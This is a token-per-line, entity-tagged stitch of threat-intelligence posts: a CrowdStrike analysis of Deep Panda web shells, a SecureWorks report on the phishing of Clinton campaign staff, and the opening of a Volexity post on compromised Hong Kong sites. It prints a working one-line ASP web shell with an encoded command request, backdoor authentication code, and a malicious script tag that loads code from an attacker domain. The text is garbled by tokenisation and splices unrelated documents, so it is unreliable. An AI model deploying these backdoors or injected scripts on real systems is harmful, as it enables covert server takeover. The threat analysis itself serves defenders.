engineering
methods
and
gamut B_malware.backdoor
of
malware
it
uses
,
and
the
countermeasures
that
organizations
can
adopt
to
mitigate
them
.

The
list
of
indicators
of
compromise
,
which
includes
Trend
Micro's
corresponding
detections
and
solutions
,
is
in
this
appendix
.

Related
Posts
:

Untangling
the
Patchwork
cyberespionage  B_malware.backdoor
Group

ChessMaster
Makes
its
Move
:
A
Look
into
the
Campaign's
cyberespionage  B_malware.backdoor
Arsenal

cyberespionage  B_malware.backdoor
Campaign
Sphinx
Goes
Mobile
With
AnubisSpy B_malware.infosteal

Hacking
Group
Spies
on
Android
Users
in
India
Using
PoriewSpy B_malware.infosteal

Learn
how
to
protect
Enterprises
,
Small
Businesses
,
and
Home
Users
from
ransomware
:

ENTERPRISE

SMALL
BUSINESS

HOME

Tags
:
Confucius
CVE-2015-1641 B_malware.unknown
CVE-2017-11882  B_malware.backdoor

Patchwork
Romance
Scam

Comments
for
this
thread
are
now
closed
.

0
Comments

TrendLabs

Recommend

Share
⤤

Login

1

Sort
by
Best

Subscribe

Add
Disqus
to
your
siteAdd
DisqusAdd

Privacy

Home
and
Home
Office

For
Business

Security
Intelligence

About
Trend
Micro

Asia
Pacific
Region
(
APAC
)
:
Australia
/
New
Zealand
,
中国
,
日本
,
대한민국
,
台灣

Latin
America
Region
(
LAR
)
:
Brasil
,
México

North
America
Region
(
NABU
)
:
United
States
,
Canada

Europe
,
Middle
East
,
&
Africa
Region
(
EMEA
)
:
France
,
Deutschland
/
Österreich
/
Schweiz
,
Italia
,
Россия
,
España
,
United
Kingdom
/
Ireland

Privacy
Statement
Legal
Policies
Copyright
©
2018
Trend
Micro
Incorporated
.

All
rights
reserved
.

×This
discussion
has
been
closed
.
Mo
'
Shells
Mo
'
Problems
-
Deep
Panda
Web B_malware.backdoor
Shells  I

Disclaimer
:
CrowdStrike
derived
this
information
from
investigations
in
non-classified
environments
.

Since
we
value
our
client's
privacy
and
interests
,
some
data
has
been
redacted
or
sanitized
.

Crowdstrike
presents
'
Mo
'
Shells
Mo
'
Problems
'
-
A
four
part
series
featuring
two
unique
web B_malware.backdoor
shells  I
used
by
a
Chinese
threat
group
we
call
Deep
Panda
.

The
series
will
culminate
with
a

CrowdCast
in
April
2014
detailing
a
case
study
of
the
incident
response
investigation
conducted
to
identify
these
web B_malware.backdoor
shells  I
.

Special
thanks
to
Josh
Phillips
of
the
CrowdStrike

Global
Intelligence
Team
for
providing
the
technical
analysis
in
this
blog
post
.

Today
we'll
cover
part
one
of
this
series
,
which
provides
an
overview
of
what
web B_malware.backdoor
shells  I
are
,
functionality
of
two
web B_malware.backdoor
shells  I
recently
identified
during
an
incident
response
investigation
and
how
they
were
leveraged
by
the
attacker
.

Parts
two
through
four
will
provide
details
on
successful
analytical
techniques
you
can
use
to
discover
web B_malware.backdoor
shells  I
within
your
environment
:

Mo
'
Shells
Mo
'
Problems
:
Deep
Panda
Web B_malware.backdoor
Shells  I
(
Part
1
)

Mo
'
Shells
Mo
'
Problems
:
File
Stacking
(
Part
2
)

Mo
'
Shells
Mo
'
Problems
:
Web
Log
Review
(
Part
3
)

Mo
'
Shells
Mo
'
Problems
:
Network
Detection
(
Part
4
)

A
Web B_malware.backdoor
Shell I
is
a
file
containing
backdoor
functionality
written
in
a
web
scripting
language
such
ASP
,
ASPX
,
PHP
or
JSP
.

When
a
web B_malware.backdoor
shell I
is
hosted
on
an
internet
facing
victim
system
,
an
adversary
can
remotely
access
the
system
to
perform
malicious
actions
.

Deep

Panda
is
a
China
based
threat
group
CrowdStrike
has
observed
targeting
companies
in
the
defense
,
legal
,
telecommunication
and
financial
industries
.

Crowdstrike
has
observed
Deep

Panda
adopting
web B_malware.backdoor
shells  I
as
their
primary
access
back
into
a
victim
organization
.

This
is
an
interesting
shift
as
web B_malware.backdoor
shells  I
have
typically
been
seen
as
only
a
first
stage
into
obtaining
a
persistent
foothold
in
an
environment
.

Previously
,
web B_malware.backdoor
shells  I
were
quickly
abandoned
once
persistent
second
stage
malware
was
successfully
beaconing
.

Using
a
web B_malware.backdoor
shell I
as
a
primary
backdoor
gives
Deep
Panda
several
advantages
:

Low
to
virtually
no
detection
by
antivirus
products

The
absence
of
command
and
control
beacon
traffic

Impossible
to
block
known
malicious
IP
addresses
to
a
web
server
since
adversary
can
easily
change
their
source
IP
address

Cookie
and
HTTP
header
authentication
aware
web B_malware.backdoor
shells  I
avoid
being
enumerated
by
search
engines
and
restrict
access
,
further
reducing
their
network
footprint

To
assist
organizations
with
identifying
web B_malware.backdoor
shells  I
in
their
environment
,
this
post
will
cover
two
popular
Deep
Panda
web B_malware.backdoor
shells  I
.

By
gaining
insight
into
their
capabilities
and
footprint
,
organizations
should
find
it
feasible
to
detect
and
remediate
these
backdoors
.

Showimg.asp

E:\inetpub\wwwroot\<Redacted>\

Path
:

MD5
Hash
:
ffa82c64720179878b25793f17b304d7  B_hash

File
Size
:

Table
1
:
'
Showimg.asp
'
Metadata

Showimg.asp
is
an
example
of
an
early
stage
web B_malware.backdoor
shell I
used
to
build
an
initial
foothold
within
a
network
.

After
it
is
replaced
by
more
robust
backdoors
,
it
may
be
left
in
place
as
a
last
resort
should
remediation
take
place
.

At
a
diminutive
28
bytes
,
it
is
one
of
the
smallest
Active

Server
Page
(
ASP
)
backdoors
in
the
wild
.

In
a
recent
case
,
we
witnessed
this
web B_malware.backdoor
shell I
written
to
a
standalone
file
(
named
showimg.asp
)
,
but
it
could
easily
be
injected
into
an
existing
page
,
making
it
even
stealthier
.

The
code
for
this
web B_malware.backdoor
shell I
can
be
found
below
:
<%execute
request(chr(42))%>

Table
2
:
'
Showimg.asp
'
Web B_malware.backdoor
Shell I
Script

ASP
uses
Microsoft
Visual
Basic
(
VBScript
)
as
its
implementation
language
.

The
code
above
uses
the
chr(
)
function
to
convert
an
integer
into
a
character
,
which
is
then
passed
as
an
argument
to
the
ASP
Request(
)
object
.

The
Request(
)
object
will
search
the
Query
String
for
any
keys
matching
the
input
.

In
our
case
,
the
code
is
equivalent
to
Request.QueryString('*
'
)
.

The
request
object
will
look
for
chr(42
)
which
is
an
asterisk
(
*
)
,
returning
whatever
is
passed
to
it
in
a
HTTP
GET
or
POST
.

Next
,
the
Execute(
)
function
will
execute
any
value
returned
by
the
lookup
.

Effectively
,
an
attacker
can
form
a
request
that
will
execute
any
VBScript
code
.

As
you
might
imagine
,
this
is
a
powerful
capability
.

For
example
,
this
code
can
perform
any
of
the
following
actions
:

File
upload
or
download

File
system
read
,
write
,
or
delete

Arbitrary
command
execution

This
web B_malware.backdoor
shell I
is
an
example
of
a
'
thick
client
'
shell
,
meaning
that
while
the
server
side
code
is
quite
small
,
attackers
typically
use
a
larger
GUI
client
to
construct
the
sent
commands
.

The
client
GUI
runs
on
the
attacker's
system
and
hence
is
not
typically
found
within
the
victim
network
.

As
a
simple
example
of
an
encoded
command
,
the
following
GET
request
would
cause
the
backdoor
to
execute
the
code
Response.Write('<h1>Hello
World</h1>
'
)
and
would
render
'
Hello
World
'
to
be
printed
in
the
web
browser
:
http://<webserver>/showimage.asp*=%52%65%73%70%6F%6E%73%65%2E%57%72%69%74%65%28%22%3C%68%31%3E%48%65%6C%6C%6F%20%57%6F%72%6C%64%3C%2F%68%31%3E%22%29  B_url.unknown

Table
3
:
'
showimg.asp
'
Web B_malware.backdoor
Shell I
Script

system_web.aspx  B_malware.backdoor

C:\inetpub\wwwroot\aspnet_client\system_web\<VERSION>\

Path
:

MD5
Hash
:
cc875db104a602e6c12196fe90559fb6  B_hash

File
Size
:
45187

Table
4
:
Metadata
of
'
system_web.aspx  B_malware.backdoor
'

system_web.aspx  B_malware.backdoor
is
an
excellent
example
of
a
more
robust
web B_malware.backdoor
shell I
used
to
replace
Deep

Panda's
traditional
beaconing
command
and
control
infrastructure
.

It
is
an
ASP.NET
backdoor
written
in
C#
,
with
far
more
capabilities
than
we
saw
with
the
showimage.asp
sample
.

The
web B_malware.backdoor
shell I
supports
a
form
of
authentication
to
protect
against
unauthorized
access
.

This
prevents
its
discovery
from
search
engine
indexing
,
vulnerability
scanning
tools
and
other
unauthorized
access
to
the
backdoor
.

In
order
to
bypass
authentication
,
a
user
session
must
satisfy
one
of
three
options
:

Pass
a
cookie
with
the
name
<Redacted>

Set
the
Keep-Alive
HTTP
header
to
320

Set
language
HTTP
header
to
contain
es-DN

Since
web B_malware.backdoor
shells  I
are
text-based
,
we
can
easily
see
how
this
authentication
takes
place
:

Init();
if
(
!IsUserValid(
)
)
int.Parse(Request.Cookies['REDACTED'].Value);

Page.Visible
=
true;
catch
(
Exception
)

Page.Visible
=
false;

Response.Clear();

Response.End();
else

Page.Visible
=
true;

Response.SetCookie(new
HttpCookie('REDACTED
'
,
DateTime.Now.Second.ToString()));
catch
(
Exception
)

Page.Visible
=
false;

Response.End();
private
void
Init(
)
if
(
Request.Cookies['cp']
!=
null
)

File.Copy(Request.PhysicalPath
,
Request.Cookies['cp'].Value
,
true);

Response.Cookies['cp'].Expires
=
DateTime.Now.AddDays(-1);

Response.End();
catch
(
Exception
ex
)

Log(ex.ToString());
private
bool
IsUserValid(
)
if
(
Request.Headers['Keep-Alive']
==
'
320
'
)
return
true;
if
(
Request.UserLanguages.Length
>
0
)
foreach
(
string
s
in
Request.UserLanguages
)
if
(
s.IndexOf('es-DN
'
)
>=
0
)
return
true;
catch
(
Exception
)
return
false;

Table
5
:
'
system_web.aspx  B_malware.backdoor
'
Authentication
Code

First
,
the
code
checks
if
a
cookie
by
the
name
of
cp
exists
.

If
so
,
the
response
object
has
its

End(
)
method
invoked
,
denying
the
user
access
.
Next
,
the
code
uses
the
IsValidUser()method
and
checks
the
Hyper
Text
Transport
Protocol
(
HTTP
)
headers
for
the
Keep-Alive
value
,
which
,
if
equal
to
320
,
will
return
true
.

If
the
value
does
not
equal
320
the

IsValidUser()method
iterates
over
the
Request.UserLanguages
collection
searching
for
a
language
named
es-DN
,
and
if
found
,
the
IsValidUser(
)
method
will
return
true
.

If
neither
check
passes
,
the
code
returns
false
and
the
code
will
finally
check
for
the
presence
of
a
cookie
named
<REDACTED>
.

If
the
cookie
is
present
,
the
authentication
step
is
satisfied
.

If
not
,
a
blank
web
page
with
no
content
is
displayed
.

After
successful
authentication
,
the
attacker
is
provided
with
the
following
page
:

system_web.aspx  B_malware.backdoor
packs
a
large
amount
of
functionality
into
a
compact
interface
.
It
provides
the
following
capabilities
:

Enumerate
attached
drives

Utilize
built
in
SQL
functions
to
connect
to
database
backend

Run
SQL
queries
and
statements

Download
,
upload
and
read
files

Directory
listing

Execute
Active
Directory
requests

Compile
and
execute
arbitrary
C#
source
code

Impersonate
a
user

The
web B_malware.backdoor
shell I
supports
8
main
commands
,
with
most
command
execution
via
Transact-SQL
using
the
xp_cmdshell
function
.

Exec

This
command
depends
on
the
contents
of
the
first
unlabeled
textbox1
.

If
unlabeled
textbox1
is
empty
,
the
code
will
enumerate
attached
drives
.

Provider=
or
Driver=
-
Will
connect
using
the
OleDbConnection
class
.

Data
Source=
-
The
code
will
connect
using
the
SqlConnection
class
.

iis://
-
If
this
appears
in
unlabeled
textbox1
,
the
code
will
use
data
from
the
second
unlabeled
textbox2
to
execute
Active
Directory
requests
.

Down

This
command
also
depends
on
the
text
contained
in
the
unlabeled
textbox1
.

If
the
field
is
left
empty
,
the
code
will
assume
a
valid
path
to
a
file
on
the
local
machine
and
will
read
and
display
contents
to
user
.

Data
Source=
-
the
code
will
assume
that
the
unlabeled
textbox2
contains
a
valid
SQL
query
and
will
execute
it
and
display
the
results
.

http://
-
If
this
appears
in
unlabeled
textbox1
,
download
content
from
the
assumed

URL
.
$SEX
–
If
this
appears
in
unlabeled
textbox1
,
pass
the
contents
to
the
Server.Execute(
)
method
.

Execute
contents
in
unlabeled
textbox1
as
a
SQL
query
and
return
binary
data
to
adversary
.

Execute
contents
in
unlabeled
textbox1
as
a
SQL
statement
and
return
valid
textual
data
to
adversary
.

Upload
the
file
chosen
by
the
Choose
File
button
and
save
it
to
a
temporary
table
in
the
database
file
worktbl
in
chunks
of
10240
bytes
.

Then
executes
xp_cmdshell
(
which
executes
the
Bulk
Copy
Program
)
to
copy
the
data
from
that
table
to
a
file
whose
name
is
specified
in
unlabeled
textbox2
.

After
the
file
is
saved
,
the
code
deletes
the
temporary
table
.

If
unlabeled
textbox1
is
a
local
file
on
infected
system
,
the
file
is
read
and
displayed
to
attacker
.
\\
-
If
unlabeled
textbox1
starts
with
\\
,
use
xp_cmdshell
to
execute
the
copy
command
to
copy
file
to
%windir%\Temp\temp.bin
.

Then
,
issue
the
dir
command
and
display
results
to
user
.

Finally
,
delete
the
temporary
file
%windir%\Temp\temp.bin
.

Perform
Active
Directory
queries
.

The
code
handles
create
,
delete
,
set
,
get
,
and
enum
queries
,
while
any
query
not
matching
those
is
executed
directly
.

All
commands
are
executed
using
the

System.DirectoryServices
API
.

Simple
wrapper
around
the
CSharpCodeProvider
API
,
allowing
the
adversary
to
compile
and
execute
arbitrary
C#
source
code
.

Login
Checkbox

Attempt
to
use
the
username
,
password
,
and
domain
from
the
User
,
Pass
and
Domain
fields
and
LogonUserA(
)
Win32
API
function
to
impersonate
a
specific
user
.

Detatch
Checkbox

Specifies
whether
commands
run
from
the
Exec
button
will
have
their
output
redirected
and
displayed
to
the
adversary
when
the
command
is
finished
executing
.

In
short
,
system_web.aspx  B_malware.backdoor
provides
an
adversary
with
a
very
stealthy
means
of
near
full
control
of
the
server
on
which
it
resides
.
This
stealth
might
be
its
most
important
attribute
.

As
we
will
see
,
identifying
web B_malware.backdoor
shells  I
can
be
much
harder
than
finding
malicious
binaries
.
In
our
next
post
,
we
will
discuss
techniques
for
identifying
web B_malware.backdoor
shells  I
.

Stay
tuned
for
Parts
2-4
as
we
cover
File
Stacking
,
Web
Log
Review
,
and
Network
Detection
.

In
the
meantime
,
register
now
for
the
April
1st
CrowdCast
.
Threat
Group-4127
Targets
Hillary
Clinton
Presidential

Campaign
www.secureworks.com B_url.normal
/research/threat-group-4127-targets-hillary-clinton-presidential-campaign I

Author
:
SecureWorks
Counter
Threat
UnitTM
Threat
Intelligence

Date
:
16
June
2016

Summary

SecureWorks®
Counter
Threat
UnitTM
(
CTU
)
researchers
track
the
activities
of
Threat
Group-4127[1]
(
TG-4127 B_malware.infosteal
)
,
which
targets
governments
,
military
,
and
international
non-governmental
organizations
(
NGOs
)
.

Components
of
TG4127
operations
have
been
reported
under
the
names
APT28 B_malware.infosteal
,
Sofacy  B_malware.infosteal
,
Sednit  B_malware.infosteal
,
and
Pawn  B_malware.infosteal
Storm I
.

CTUTM
researchers
assess
with
moderate
confidence
that
the
group
is
operating
from
the
Russian
Federation
and
is
gathering
intelligence
on
behalf
of
the
Russian
government
.

Between
October
2015
and
May
2016
,
CTU
researchers
analyzed
8,909
Bitly
links
that
targeted
3,907
individual

Gmail
accounts
and
corporate
and
organizational
email
accounts
that
use
Gmail
as
a
service
.

In
March
2016
,
CTU
researchers
identified
a
spearphishing
campaign
using
Bitly
accounts
to
shorten
malicious
URLs
.

The
targets
were
similar
to
a
2015
TG-4127 B_malware.infosteal
campaign
—
individuals
in
Russia
and
the
former
Soviet
states
,
current
and
former
military
and
government
personnel
in
the
U.S.
and
Europe
,
individuals
working
in
the
defense
and
government
supply
chain
,
and
authors
and
journalists
—
but
also
included
email
accounts
linked
to
the
November
2016
United

States
presidential
election
.

Specific
targets
include
staff
working
for
or
associated
with
Hillary
Clinton's
presidential
campaign
and
the
Democratic
National
Committee
(
DNC
)
,
including
individuals
managing
Clinton's
communications
,
travel
,
campaign
finances
,
and
advising
her
on
policy
.

Spearphishing
details

The
short
links
in
the
spearphishing
emails
redirected
victims
to
a
TG-4127-controlled  B_malware.infosteal
URL
that
spoofed
a
legitimate

Google
domain
.

A
Base64-encoded
string
containing
the
victim's
full
email
address
is
passed
with
this
URL
,
prepopulating
a
fake
Google
login
page
displayed
to
the
victim
.

If
a
victim
enters
their
credentials
,
TG-4127 B_malware.infosteal
can
establish
a
session
with
Google
and
access
the
victim's
account
.

The
threat
actors
may
be
able
to
keep
this
session
alive
and
maintain
persistent
access
.

Hillary
for
America

The
Hillary
for
America
presidential
campaign
owns
the
hillaryclinton.com  B_url.normal
domain
,
which
is
used
for
the
campaign
website
(
www.hillaryclinton.com  B_url.normal
)
and
for
email
addresses
used
by
campaign
staff
.

An
examination
of
the
hillaryclinton.com  B_url.normal
DNS
records
shows
that
the
domain's
MX
records
,
which
indicate
the
mail
server
used
by
the
domain
,
point
to
aspmx.l.google.com  B_url.normal
,
the
mail
server
used
by
Google
Apps
.

Google
Apps
allows
organizations
to
use
Gmail
as
their
organizational
mail
solution
.

TG-4127 B_malware.infosteal
exploited
the
Hillary
for
America
campaign's
use
of
Gmail
and
leveraged
campaign
employees
'
expectation
of
the
standard
Gmail
login
page
to
access
their
email
account
.

When
presented
with
TG-4127's B_malware.infosteal
spoofed
login
page
(
see
Figure
1
)
,
victims
might
be
convinced
it
was
the
legitimate
login
page
for
their
hillaryclinton.com  B_url.normal
email
account
.

Figure
1
.
Example
of
a
TG-4127 B_malware.infosteal
fake
Google
Account
login
page
.

(
Source
:
www.phishtank.com B_url.unknown
)

CTU
researchers
observed
the
first
short
links
targeting
hillaryclinton.com  B_url.normal
email
addresses
being
created
in
mid-

March
2016;
the
last
link
was
created
in
mid-May
.

During
this
period
,
TG-4127 B_malware.infosteal
created
213
short
links
targeting
108
email
addresses
on
the
hillaryclinton.com  B_url.normal
domain
.

Through
open-source
research
,
CTU
researchers
identified
the
owners
of
66
of
the
targeted
email
addresses
.

There
was
no
open-source
footprint
for
the
remaining
42
addresses
,
suggesting
that
TG-4127 B_malware.infosteal
acquired
them
from
another
source
,
possibly
other
intelligence
activity
.

The
identified
email
owners
held
a
wide
range
of
responsibilities
within
the
Hillary
for
America
campaign
,
extending
from
senior
figures
to
junior
employees
and
the
group
mailboxes
for
various
regional
offices
.

Targeted
senior
figures
managed
communications
and
media
affairs
,
policy
,
speech
writing
,
finance
,
and
travel
,
while
junior
figures
arranged
schedules
and
travel
for
Hillary
Clinton's
campaign
trail
.

Targets
held
the
following
titles
:

National
political
director

Finance
director

Director
of
strategic
communications

Director
of
scheduling

Director
of
travel

Traveling
press
secretary

Travel
coordinator

Publicly
available
Bitly
data
reveals
how
many
of
the
short
links
were
clicked
,
likely
by
a
victim
opening
a
spearphishing
email
and
clicking
the
link
to
the
fake
Gmail
login
page
.

Only
20
of
the
213
short
links
have
been
clicked
as
of
this
publication
.

Eleven
of
the
links
were
clicked
once
,
four
were
clicked
twice
,
two
were
clicked
three
times
,
and
two
were
clicked
four
times
.

Democratic
National
Committee

The
U.S.
Democratic
party's
governing
body
,
the
Democratic
National
Committee
(
DNC
)
,
uses
the
dnc.org
domain
for
its
staff
email
.

Between
mid-March
and
mid-April
2016
,
TG-4127 B_malware.infosteal
created
16
short
links
targeting
nine
dnc.org
email
accounts
.

CTU
researchers
identified
the
owners
of
three
of
these
accounts;
two
belonged
to
the
DNC's
secretary
emeritus
,
and
one
belonged
to
the
communications
director
.

Four
of
the
16
short
links
were
clicked
,
three
by
the
senior
staff
members
.

As
of
this
publication
,
dnc.org
does
not
use
the
Google
Apps
Gmail
email
service
.

However
,
because
dnc.org
email
accounts
were
targeted
in
the
same
way
as
hillaryclinton.com  B_url.normal
accounts
,
it
is
likely
that
dnc.org
did
use
Gmail
at
that
time
and
later
moved
to
a
different
service
.

CTU
researchers
do
not
have
evidence
that
these
spearphishing
emails
are
connected
to
the
DNC
network
compromise
that
was
revealed
on
June
14
.

However
,
a
coincidence
seems
unlikely
,
and
CTU
researchers
suspect
that
TG-4127 B_malware.infosteal
used
the
spearphishing
emails
or
similar
techniques
to
gain
an
initial
foothold
in
the
DNC
network
.

Personal
email
accounts

CTU
researchers
identified
TG-4127 B_malware.infosteal
targeting
26
personal
gmail.com
accounts
belonging
to
individuals
linked
to
the

Hillary
for
America
campaign
,
the
DNC
,
or
other
aspects
of
U.S.
national
politics
.

Five
of
the
individuals
also
had
a
hillaryclinton.com  B_url.normal
email
account
that
was
targeted
by
TG-4127 B_malware.infosteal
.

Many
of
these
individuals
held
communications
,
media
,
finance
,
or
policy
roles
.

They
include
the
director
of
speechwriting
for
Hillary
for
America
and
the
deputy
director
office
of
the
chair
at
the
DNC
.

TG-4127 B_malware.infosteal
created
150
short
links
targeting
this
group
.

As
of
this
publication
,
40
of
the
links
have
been
clicked
at
least
once
.

Related
activity
and
implications

Although
the
2015
campaign
did
not
focus
on
individuals
associated
with
U.S.
politics
,
open-source
evidence
suggests
that
TG-4127 B_malware.infosteal
targeted
individuals
connected
to
the
U.S.
White
House
in
early
2015
.

The
threat
group
also
reportedly
targeted
the
German
parliament
and
German
Chancellor
Angela
Merkel's
Christian
Democratic
Union
party
.

CTU
researchers
have
not
observed
TG-4127 B_malware.infosteal
use
this
technique
(
using
Bitly
short
links
)
to
target
the
U.S.

Republican
party
or
the
other
U.S.
presidential
candidates
whose
campaigns
were
active
between
mid-March
and
mid-May
:
Donald
Trump
,
Bernie
Sanders
,
Ted
Cruz
,
Marco
Rubio
,
and
John
Kasich
.

However
,
the
following
email
domains
do
not
use
Google
mail
servers
and
may
have
been
targeted
by
other
means
:
gop.com B_url.unknown
—
used
by
the
Republican
National
Committee
donaldjtrump.com  B_url.unknown
—
used
by
the
Donald
Trump
campaign
johnkasich.com  B_url.unknown
—
used
by
the
John
Kasich
campaign

Access
to
targets
'
Google
accounts
allows
TG-4127 B_malware.infosteal
to
review
internal
emails
and
potentially
access
other
Google

Apps
services
used
by
these
organizations
,
such
as
Google
Drive
.

In
addition
to
the
value
of
the
intelligence
,
the
threat
actors
could
also
exploit
this
access
for
other
malicious
activity
,
such
as
generating
spearphishing
emails
from
internal
email
addresses
to
compromise
the
organizations
'
networks
with
malware
.

The
Russian
government
views
the
U.S.
as
a
strategic
rival
and
is
known
to
task
its
intelligence
agencies
with
gathering
confidential
information
about
individuals
and
organizations
close
to
the
center
of
power
in
the
U.S.

Individuals
working
for
the
Hillary
for
America
campaign
could
have
information
about
proposed
policies
for
a
Clinton
presidency
,
including
foreign-policy
positions
,
which
would
be
valuable
to
the
Russian
government
.

Information
about
travel
plans
and
campaign
scheduling
could
provide
short-term
opportunities
for
other
intelligence
operations
.

Long-term
access
to
email
accounts
of
senior
campaign
advisors
,
who
may
be
appointed
to
staff
positions
in
a

Clinton
administration
,
could
provide
TG-4127 B_malware.infosteal
and
the
Russian
government
with
access
to
those
individual's
accounts
.

Conclusion

While
TG-4127 B_malware.infosteal
continues
to
primarily
threaten
organizations
and
individuals
operating
in
Russia
and
former
Soviet
states
,
this
campaign
illustrates
its
willingness
to
expand
its
scope
to
other
targets
that
have
intelligence
of
interest
to
the
Russian
government
.

Non-governmental
political
organizations
may
provide
access
to
desirable
national
policy
information
,
especially
foreign
policy
,
but
may
not
have
the
same
level
of
protection
and
security
as
governmental
organizations
.

Targeting
individuals
linked
to
presidential
campaigns
could
represent
an
intelligence
'
long
game
,
'
as
establishing
access
to
potential
U.S.
administration
staff
before
they
are
appointed
could
be
easier
than
targeting
them
when
they
are
established
in
the
White
House
.

Access
to
an
individual's
personal
or
corporate
email
account
provides
a
substantial
amount
of
useful
intelligence
,
and
threat
actors
could
also
leverage
the
access
to
launch
additional
attacks
to
penetrate
the
network
of
an
associated
organization
.

Users
rarely
check
the
full
URL
associated
with
short
links
,
so
threat
groups
can
use
URL-shortening
services
to
effectively
hide
malicious
URLs
.

Threat
actors
can
use
the
services
'
detailed
statistics
about
which
links
were
clicked
when
,
and
from
what
location
,
to
track
the
success
of
a
spearphishing
campaign
.

A
single
compromised
account
could
allow
TG-4127 B_malware.infosteal
to
achieve
its
operational
goals
.

CTU
researchers
recommend
that
clients
take
appropriate
precautions
to
minimize
the
risk
of
these
types
of
attacks
:

Educate
users
about
the
risks
of
spearphishing
emails
.

Use
caution
and
exercise
due
diligence
when
faced
with
a
shortened
link
,
especially
in
unsolicited
email
messages
.

Pasting
Bitly
URLs
,
appended
with
a
plus
sign
,
into
the
address
bar
of
a
web
browser
reveals
the
full
URL
.

For
clients
using
Gmail
as
a
corporate
mail
solution
,
educate
users
about
the
risk
of
spoofed
login
pages
and
encourage
them
to
confirm
they
are
on
the
legitimate
Google
Accounts
page
when
presented
with
a
Google
login
prompt
.

Appendix
—
Gauging
confidence
level

CTU
researchers
have
adopted
the
grading
system
published
by
the
U.S.
Office
of
the
Director
of
National

Intelligence
to
indicate
confidence
in
their
assessments
:

High
confidence
generally
indicates
that
judgments
are
based
on
high-quality
information
,
and/or
that
the
nature
of
the
issue
makes
it
possible
to
render
a
solid
judgment
.

A
'
high
confidence
'
judgment
is
not
a
fact
or
a
certainty
,
however
,
and
such
judgments
still
carry
a
risk
of
being
wrong
.

Moderate
confidence
generally
means
that
the
information
is
credibly
sourced
and
plausible
but
not
of
sufficient
quality
or
corroborated
sufficiently
to
warrant
a
higher
level
of
confidence
.

Low
confidence
generally
means
that
the
information's
credibility
and/or
plausibility
is
questionable
,
or
that
the
information
is
too
fragmented
or
poorly
corroborated
to
make
solid
analytic
inferences
,
or
that
[there
are]
significant
concerns
or
problems
with
the
sources
.

[1]
The
SecureWorks
Counter
Threat
Unit
(
CTU
)
research
team
tracks
threat
groups
by
assigning
them
four-digit
randomized
numbers
(
4127
in
this
case
)
,
and
compiles
information
from
external
sources
and
from
first-hand
incident
response
observations
.
Democracy
in
Hong
Kong
Under
Attack

Posted
on
October
9
,
2014
by
Steven
Adair

Over
the
last
few
months
,
Volexity  B_malware.backdoor
has
been
tracking
a
particularly
remarkable
advanced
persistent
threat
(
APT B_malware.unknown
)
operation
involving
strategic
web
compromises
of
websites
in
Hong
Kong
and
Japan
.

In
both
countries
,
the
compromised
websites
have
been
particularly
notable
for
their
relevance
to
current
events
and
the
high
profile
nature
of
the
organizations
involved
.

In
particular
the

Hong
Kong
compromises
appear
to
come
on
the
heels
of
the
Occupy
Central
Campaign
shifting
into
high
gear
.

These
compromises
were
discovered
following
the
identification
of
malicious
JavaScript
that
had
been
added
to
legitimate
code
on
the
impacted
websites
.

This
code
meant
that
visitors
were
potentially
subjected
to
exploit
and
malicious
Java
Applets
designed
to
install
malware
on
their
systems
.

While
investigating
these
cases
,
Volexity  B_malware.backdoor
also
discovered
additional
APT
attack
campaigns
involving
multiple
other
pro-democratic
websites
in
Hong
Kong
.

These
attempts
at
exploitation
,
compromise
,
and
digital
surveillance
are
detailed
throughout
this
post
.

Compromised
Pro-Democratic
Hong
Kong
Websites

Warning
:
Many
of
these
websites
may
still
be
compromised
and
present
a
risk
to
visitors
.

Browse
with
caution
.

Alliance
for
True
Democracy
â€
'
Hong
Kong

Over
the
last
two
days
,
Volexity  B_malware.backdoor
has
observed
malicious
code
being
served
up
from
the
website
of
the
Alliance
for
True
Democracy
(
ATD
)
in
Hong
Kong
(
www.atd.hk  B_url.distribute
)
.

ATD
is
an
alliance
of
people
and
organizations
dedicated
to
democracy
and
universal
suffrage
in
Hong
Kong
.

At
the
time
of
this
writing
malicious
code
is
still
live
on
the
website
,
so
please
visit
with
care
until
the
website
is
clean
.

Below
is
a
screen
shot
of
the
malicious
code
references
found
pre-pended
to
a
JavaScript
file
on
the
website
named
superfish.js
.

This
JavaScript
file
is
called
from
other
parts
of
the
website
and
effectively
nests
the
loading
of
additional
JavaScript
written
and
interpeted
as
:
<script
language=javascript
src=http://java-se.com/o.js</script>  B_url.normal

The
domain
name
java-se.com B_url.normal
is
known
bad
and
associated
with
APT
activity
.

At
the
time
of
this
post
,
the
domain
is
hosted
on
the

Japanese
IP
address
210.253.101.105 B_ip.unknown
.

7506
|
210.253.96.0/20 B_ip.unknown
|
INTERQ
|
JP
|
GMO.JP
|
GMO
INTERNET
INC
.

Volexity  B_malware.backdoor
has
yet
to
actually
see
the
contents
of
the
file
o.js
,
as
the
websites
has
continuously
returned
HTTP
403
responses
each
time
it
was
requested
.

The
file
was
requested
from
IP
addresses
throughout
Asia
without
ever
returning
valid
content
.

Itâ€TMs
unclear
if
this
code
is
activated
at
certain
times
or
if
there
is
a
whitelist
of
IPs
restricting
access
to
the
file
to
specific
targets
.

This
same
code
has
also
been
observed
being
served
from
another
Hong
Kong
website
described
in
the
next
section
.

Webshell  B_malware.backdoor
Backdoor

While
examining
the
ATD
website
,
Volexity  B_malware.backdoor
also
observed
that
the
site
had
a
password
protected
backdoor
webshell
placed
on
it
.

This
is
a
fairly
popular
webshell
that
Volexity  B_malware.backdoor
has
encountered
on
several
occasions
when
dealing
with
website
compromises
.

Volexity  B_malware.backdoor
refers
to
this
shell
as
the
Angel
Webshell
,
named
after
its
default
password
of
â€œangelâ€
.

The
shell
will
simply
display
the
text
â€œPassword:â€
,
a
text
input
box
,
and
a
Login
button
.

A
screen
shot
of
the
webshell
as
observed
on
the
ATD
website
can
be
seen
below
.

Despite
the
shell
being
written
in
PHP
and
only
displaying
a
simple
Login
prompt
,
it
is
easy
to
identify
the
Angel
webshell
based
on
unique
components
of
its
viewable
HTML
source
code
.

The
HTML
source
of
this
page
is
displayed
in
the
following
image
.

While
Volexity  B_malware.backdoor
operates
under
the
assumption
attackers
have
placed
webshells
on
webservers
they
have
compromised
,
in
this
particular
instance
it
can
be
seen
with
certainty
.

Attackers
will
often
upload
new
webshells
or
add
simple
China
Chopper
style
modifications
to
legitimate
existing
files
in
an
attempt
to
maintain
persistence
to
these
systems
.

Democratic
Party
Hong
Kong

In
the
last
week
,
Volexity  B_malware.backdoor
also
observed
both
the
English
and
Chinese
language
websites
for
the
Democratic
Party
Hong
Kong
compromised
with
the
same
malicious
code
found
ont
he
ATD
website
(
www.dphk.org  B_url.unknown
|
eng.dphk.org  B_url.unknown
)
.

DPHK
